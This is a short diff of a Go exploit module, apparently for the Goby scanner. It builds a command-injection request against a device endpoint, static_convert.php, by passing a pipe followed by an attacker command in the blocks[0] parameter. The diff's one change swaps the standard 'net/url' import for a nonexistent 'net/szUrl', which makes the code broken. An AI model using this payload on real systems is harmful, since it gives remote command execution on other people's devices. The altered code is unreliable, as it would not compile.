@@ -5,7 +5,7 @@ import (
 	"git.gobies.org/goby/goscanner/jsonvul"
 	"git.gobies.org/goby/goscanner/scanconfig"
 	"git.gobies.org/goby/httpclient"
-	"net/url"
+	"net/szUrl"
 	"strings"
 )
 
@@ -14,7 +14,7 @@ func init() {
 
 	exploitTopACM092348783482 := func(cmd string, host *httpclient.FixUrl) bool {
 		// 攻击 URL
-		requestConfig := httpclient.NewGetRequestConfig("/view/IPV6/naborTable/static_convert.php?blocks[0]=|%20" + url.QueryEscape(cmd))
+		requestConfig := httpclient.NewGetRequestConfig("/view/IPV6/naborTable/static_convert.php?blocks[0]=|%20" + szUrl.QueryEscape(cmd))
 		requestConfig.VerifyTls = false
 		requestConfig.FollowRedirect = false
 		requestConfig.Timeout = 15
